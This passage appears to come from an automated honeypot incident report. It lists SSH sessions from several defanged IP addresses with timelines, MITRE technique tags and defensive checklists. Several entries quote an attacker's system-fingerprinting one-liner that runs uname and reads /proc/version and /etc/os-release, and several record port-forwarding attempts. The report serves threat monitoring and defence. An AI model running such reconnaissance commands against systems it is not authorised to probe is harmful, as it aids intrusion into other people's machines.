- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-537f3da007da

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:56 |
| **Last Seen** | 2026-08-04 12:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:56:32` | `cowrie.session.connect` |
| `2026-08-04 12:56:33` | `cowrie.client.version` |
| `2026-08-04 12:56:33` | `cowrie.client.kex` |
| `2026-08-04 12:56:34` | `cowrie.login.success` |
| `2026-08-04 12:56:36` | `cowrie.session.params` |
| `2026-08-04 12:56:36` | `cowrie.command.input` |
| `2026-08-04 12:56:36` | `cowrie.command.input` |
| `2026-08-04 12:56:36` | `cowrie.command.input` |
| `2026-08-04 12:56:36` | `cowrie.command.input` |
| `2026-08-04 12:56:36` | `cowrie.command.input` |
| `2026-08-04 12:56:36` | `cowrie.command.success` |
| `2026-08-04 12:56:36` | `cowrie.command.input` |
| `2026-08-04 12:56:36` | `cowrie.command.input` |
| `2026-08-04 12:56:36` | `cowrie.command.input` |
| `2026-08-04 12:56:36` | `cowrie.command.input` |
| `2026-08-04 12:56:36` | `cowrie.log.closed` |
| `2026-08-04 12:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51424f40b62a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:56 |
| **Last Seen** | 2026-08-04 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:56:51` | `cowrie.session.connect` |
| `2026-08-04 12:56:51` | `cowrie.client.version` |
| `2026-08-04 12:56:51` | `cowrie.client.kex` |
| `2026-08-04 12:56:52` | `cowrie.login.success` |
| `2026-08-04 12:56:53` | `cowrie.session.params` |
| `2026-08-04 12:56:53` | `cowrie.command.input` |
| `2026-08-04 12:56:53` | `cowrie.log.closed` |
| `2026-08-04 12:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92c0468c76b3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:58 |
| **Last Seen** | 2026-08-04 12:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:58:06` | `cowrie.session.connect` |
| `2026-08-04 12:58:07` | `cowrie.client.version` |
| `2026-08-04 12:58:07` | `cowrie.client.kex` |
| `2026-08-04 12:58:09` | `cowrie.login.success` |
| `2026-08-04 12:58:10` | `cowrie.session.params` |
| `2026-08-04 12:58:10` | `cowrie.command.input` |
| `2026-08-04 12:58:10` | `cowrie.command.input` |
| `2026-08-04 12:58:10` | `cowrie.command.input` |
| `2026-08-04 12:58:10` | `cowrie.command.input` |
| `2026-08-04 12:58:10` | `cowrie.command.input` |
| `2026-08-04 12:58:10` | `cowrie.command.success` |
| `2026-08-04 12:58:10` | `cowrie.command.input` |
| `2026-08-04 12:58:10` | `cowrie.command.input` |
| `2026-08-04 12:58:10` | `cowrie.command.input` |
| `2026-08-04 12:58:10` | `cowrie.command.input` |
| `2026-08-04 12:58:11` | `cowrie.log.closed` |
| `2026-08-04 12:58:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e86c4c538ed2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]182` |
| **First Seen** | 2026-08-04 12:58 |
| **Last Seen** | 2026-08-04 12:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:58:16` | `cowrie.session.connect` |
| `2026-08-04 12:58:16` | `cowrie.client.version` |
| `2026-08-04 12:58:16` | `cowrie.client.kex` |
| `2026-08-04 12:58:16` | `cowrie.login.success` |
| `2026-08-04 12:58:16` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:58:17` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]182` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6bb2e1d6262

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:58 |
| **Last Seen** | 2026-08-04 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:58:29` | `cowrie.session.connect` |
| `2026-08-04 12:58:29` | `cowrie.client.version` |
| `2026-08-04 12:58:30` | `cowrie.client.kex` |
| `2026-08-04 12:58:30` | `cowrie.login.success` |
| `2026-08-04 12:58:31` | `cowrie.session.params` |
| `2026-08-04 12:58:31` | `cowrie.command.input` |
| `2026-08-04 12:58:31` | `cowrie.log.closed` |
| `2026-08-04 12:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8da83e9599b1

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]41` |
| **First Seen** | 2026-08-04 12:58 |
| **Last Seen** | 2026-08-04 12:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:58:54` | `cowrie.session.connect` |
| `2026-08-04 12:58:55` | `cowrie.client.version` |
| `2026-08-04 12:58:55` | `cowrie.client.kex` |
| `2026-08-04 12:58:56` | `cowrie.login.success` |
| `2026-08-04 12:58:57` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e94ea2274ffa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:59 |
| **Last Seen** | 2026-08-04 12:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:59:41` | `cowrie.session.connect` |
| `2026-08-04 12:59:41` | `cowrie.client.version` |
| `2026-08-04 12:59:42` | `cowrie.client.kex` |
| `2026-08-04 12:59:43` | `cowrie.login.success` |
| `2026-08-04 12:59:45` | `cowrie.session.params` |
| `2026-08-04 12:59:45` | `cowrie.command.input` |
| `2026-08-04 12:59:45` | `cowrie.command.input` |
| `2026-08-04 12:59:45` | `cowrie.command.input` |
| `2026-08-04 12:59:45` | `cowrie.command.input` |
| `2026-08-04 12:59:45` | `cowrie.command.input` |
| `2026-08-04 12:59:45` | `cowrie.command.success` |
| `2026-08-04 12:59:45` | `cowrie.command.input` |
| `2026-08-04 12:59:45` | `cowrie.command.input` |
| `2026-08-04 12:59:45` | `cowrie.command.input` |
| `2026-08-04 12:59:45` | `cowrie.command.input` |
| `2026-08-04 12:59:46` | `cowrie.log.closed` |
| `2026-08-04 12:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce1043cfd7b8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 13:00 |
| **Last Seen** | 2026-08-04 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:00:07` | `cowrie.session.connect` |
| `2026-08-04 13:00:07` | `cowrie.client.version` |
| `2026-08-04 13:00:07` | `cowrie.client.kex` |
| `2026-08-04 13:00:08` | `cowrie.login.success` |
| `2026-08-04 13:00:09` | `cowrie.session.params` |
| `2026-08-04 13:00:09` | `cowrie.command.input` |
| `2026-08-04 13:00:09` | `cowrie.log.closed` |
| `2026-08-04 13:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c30202c62bb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:01 |
| **Last Seen** | 2026-08-04 13:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:01:18` | `cowrie.session.connect` |
| `2026-08-04 13:01:18` | `cowrie.client.version` |
| `2026-08-04 13:01:18` | `cowrie.client.kex` |
| `2026-08-04 13:01:20` | `cowrie.login.success` |
| `2026-08-04 13:01:22` | `cowrie.session.params` |
| `2026-08-04 13:01:22` | `cowrie.command.input` |
| `2026-08-04 13:01:22` | `cowrie.command.input` |
| `2026-08-04 13:01:22` | `cowrie.command.input` |
| `2026-08-04 13:01:22` | `cowrie.command.input` |
| `2026-08-04 13:01:22` | `cowrie.command.input` |
| `2026-08-04 13:01:22` | `cowrie.command.success` |
| `2026-08-04 13:01:22` | `cowrie.command.input` |
| `2026-08-04 13:01:22` | `cowrie.command.input` |
| `2026-08-04 13:01:22` | `cowrie.command.input` |
| `2026-08-04 13:01:22` | `cowrie.command.input` |
| `2026-08-04 13:01:23` | `cowrie.log.closed` |
| `2026-08-04 13:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f34933f61282

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]57` |
| **First Seen** | 2026-08-04 13:02 |
| **Last Seen** | 2026-08-04 13:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:02:31` | `cowrie.session.connect` |
| `2026-08-04 13:02:31` | `cowrie.client.version` |
| `2026-08-04 13:02:31` | `cowrie.client.kex` |
| `2026-08-04 13:02:32` | `cowrie.login.success` |
| `2026-08-04 13:02:33` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]57` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]57` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb8a8002c007

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-08-04 13:02 |
| **Last Seen** | 2026-08-04 13:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:02:42` | `cowrie.session.connect` |
| `2026-08-04 13:02:42` | `cowrie.client.version` |
| `2026-08-04 13:02:42` | `cowrie.client.kex` |
| `2026-08-04 13:02:43` | `cowrie.login.success` |
| `2026-08-04 13:02:43` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917c18c38d72

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:02 |
| **Last Seen** | 2026-08-04 13:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:02:49` | `cowrie.session.connect` |
| `2026-08-04 13:02:49` | `cowrie.client.version` |
| `2026-08-04 13:02:49` | `cowrie.client.kex` |
| `2026-08-04 13:02:51` | `cowrie.login.success` |
| `2026-08-04 13:02:53` | `cowrie.session.params` |
| `2026-08-04 13:02:53` | `cowrie.command.input` |
| `2026-08-04 13:02:53` | `cowrie.command.input` |
| `2026-08-04 13:02:53` | `cowrie.command.input` |
| `2026-08-04 13:02:53` | `cowrie.command.input` |
| `2026-08-04 13:02:53` | `cowrie.command.input` |
| `2026-08-04 13:02:53` | `cowrie.command.success` |
| `2026-08-04 13:02:53` | `cowrie.command.input` |
| `2026-08-04 13:02:53` | `cowrie.command.input` |
| `2026-08-04 13:02:53` | `cowrie.command.input` |
| `2026-08-04 13:02:53` | `cowrie.command.input` |
| `2026-08-04 13:02:54` | `cowrie.log.closed` |
| `2026-08-04 13:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f83f91de3c02

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]182` |
| **First Seen** | 2026-08-04 13:03 |
| **Last Seen** | 2026-08-04 13:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:03:18` | `cowrie.session.connect` |
| `2026-08-04 13:03:18` | `cowrie.client.version` |
| `2026-08-04 13:03:18` | `cowrie.client.kex` |
| `2026-08-04 13:03:19` | `cowrie.login.success` |
| `2026-08-04 13:03:19` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:03:19` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]182` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a251cada41c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:04 |
| **Last Seen** | 2026-08-04 13:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:04:20` | `cowrie.session.connect` |
| `2026-08-04 13:04:21` | `cowrie.client.version` |
| `2026-08-04 13:04:21` | `cowrie.client.kex` |
| `2026-08-04 13:04:22` | `cowrie.login.success` |
| `2026-08-04 13:04:24` | `cowrie.session.params` |
| `2026-08-04 13:04:24` | `cowrie.command.input` |
| `2026-08-04 13:04:24` | `cowrie.command.input` |
| `2026-08-04 13:04:24` | `cowrie.command.input` |
| `2026-08-04 13:04:24` | `cowrie.command.input` |
| `2026-08-04 13:04:24` | `cowrie.command.input` |
| `2026-08-04 13:04:24` | `cowrie.command.success` |
| `2026-08-04 13:04:24` | `cowrie.command.input` |
| `2026-08-04 13:04:24` | `cowrie.command.input` |
| `2026-08-04 13:04:24` | `cowrie.command.input` |
| `2026-08-04 13:04:24` | `cowrie.command.input` |
| `2026-08-04 13:04:25` | `cowrie.log.closed` |
| `2026-08-04 13:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d8750a9e3f9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:05 |
| **Last Seen** | 2026-08-04 13:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:05:52` | `cowrie.session.connect` |
| `2026-08-04 13:05:52` | `cowrie.client.version` |
| `2026-08-04 13:05:52` | `cowrie.client.kex` |
| `2026-08-04 13:05:53` | `cowrie.login.success` |
| `2026-08-04 13:05:55` | `cowrie.session.params` |
| `2026-08-04 13:05:55` | `cowrie.command.input` |
| `2026-08-04 13:05:55` | `cowrie.command.input` |
| `2026-08-04 13:05:55` | `cowrie.command.input` |
| `2026-08-04 13:05:55` | `cowrie.command.input` |
| `2026-08-04 13:05:55` | `cowrie.command.input` |
| `2026-08-04 13:05:55` | `cowrie.command.success` |
| `2026-08-04 13:05:55` | `cowrie.command.input` |
| `2026-08-04 13:05:55` | `cowrie.command.input` |
| `2026-08-04 13:05:55` | `cowrie.command.input` |
| `2026-08-04 13:05:55` | `cowrie.command.input` |
| `2026-08-04 13:05:56` | `cowrie.log.closed` |
| `2026-08-04 13:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad016f7b30e4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:07 |
| **Last Seen** | 2026-08-04 13:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:07:23` | `cowrie.session.connect` |
| `2026-08-04 13:07:23` | `cowrie.client.version` |
| `2026-08-04 13:07:23` | `cowrie.client.kex` |
| `2026-08-04 13:07:25` | `cowrie.login.success` |
| `2026-08-04 13:07:26` | `cowrie.session.params` |
| `2026-08-04 13:07:26` | `cowrie.command.input` |
| `2026-08-04 13:07:26` | `cowrie.command.input` |
| `2026-08-04 13:07:26` | `cowrie.command.input` |
| `2026-08-04 13:07:26` | `cowrie.command.input` |
| `2026-08-04 13:07:26` | `cowrie.command.input` |
| `2026-08-04 13:07:26` | `cowrie.command.success` |
| `2026-08-04 13:07:26` | `cowrie.command.input` |
| `2026-08-04 13:07:26` | `cowrie.command.input` |
| `2026-08-04 13:07:26` | `cowrie.command.input` |
| `2026-08-04 13:07:26` | `cowrie.command.input` |
| `2026-08-04 13:07:27` | `cowrie.log.closed` |
| `2026-08-04 13:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b10b6dd224f0

| Field | Detail |
|---|---|
| **Source IP** | `49.206.201[.]253` |
| **First Seen** | 2026-08-04 13:08 |
| **Last Seen** | 2026-08-04 13:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
